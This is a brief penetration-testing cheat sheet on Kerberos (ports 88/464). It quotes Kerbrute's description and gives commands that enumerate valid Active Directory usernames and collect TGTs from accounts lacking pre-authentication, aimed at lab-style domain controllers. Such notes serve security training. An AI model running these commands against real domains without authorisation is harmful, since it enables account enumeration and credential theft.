# 88/464 - Kerberos

## Kerbrute

> This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication. It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.

```
# enum valid usernames
./kerbrute userenum userlist.txt -d spookysec.local --dc 10.10.70.25
```

![](<../../.gitbook/assets/image (32) (2) (1).png>)

```
# validate users and grabbing TGTs if NO PREAUTH is present
kerbrute -domain DOMAIN.LOCAL -users users.txt -dc-ip 10.10.10.175
```

&#x20;****&#x20;
